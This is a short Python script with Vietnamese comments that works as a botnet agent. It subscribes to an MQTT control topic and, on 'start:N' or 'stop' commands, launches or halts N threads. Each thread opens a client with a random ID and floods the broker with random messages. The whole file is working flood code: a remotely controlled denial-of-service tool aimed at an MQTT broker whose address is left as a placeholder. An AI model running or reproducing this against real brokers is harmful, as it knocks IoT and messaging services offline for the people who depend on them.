import paho.mqtt.client as mqtt
import threading
import time
import random
import string

BROKER_IP = 'broker-ip'  # Đổi thành IP broker của bạn
BROKER_PORT = 1883
CONTROL_TOPIC = 'botnet/control'

attack_on = False
attack_rate = 0
clients = []
clients_lock = threading.Lock()

def random_client_id(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def client_loop(client_id):
    try:
        client = mqtt.Client(client_id=client_id)
        client.connect(BROKER_IP, BROKER_PORT, keepalive=120)
        client.loop_start()
        print(f"Client connected: {client_id}")

        while attack_on:
            # Gửi message để giữ client hoạt động
            topic = "test/topic"
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
            client.publish(topic, payload)
            time.sleep(0.1)  # Điều chỉnh tốc độ gửi message

        client.loop_stop()
        client.disconnect()
        print(f"Client disconnected: {client_id}")

    except Exception as e:
        print(f"Client {client_id} error: {e}")

def start_attack(rate):
    global clients, attack_on
    with clients_lock:
        attack_on = True
        print(f"Starting attack with {rate} clients")
        for _ in range(rate):
            client_id = random_client_id()
            t = threading.Thread(target=client_loop, args=(client_id,), daemon=True)
            t.start()
            clients.append(t)

def stop_attack():
    global clients, attack_on
    with clients_lock:
        attack_on = False
        print("Stopping attack...")
        # Clients sẽ tự ngắt khi attack_on = False
        # Chờ tất cả thread kết thúc
        for t in clients:
            t.join(timeout=2)
        clients = []
        print("Attack stopped")

def on_message(client, userdata, msg):
    global attack_on, attack_rate
    command = msg.payload.decode().strip()
    print(f"Received command: {command}")

    if command.startswith("start:"):
        try:
            rate = int(command.split(":")[1])
            if rate > 0:
                stop_attack()  # Dừng attack cũ nếu có
                start_attack(rate)
            else:
                print("Rate phải lớn hơn 0")
        except Exception as e:
            print(f"Lỗi phân tích lệnh start: {e}")

    elif command == "stop":
        stop_attack()

def main():
    client = mqtt.Client()
    client.on_message = on_message
    client.connect(BROKER_IP, BROKER_PORT, 60)
    client.subscribe(CONTROL_TOPIC)
    client.loop_forever()

if __name__ == "__main__":
    main()
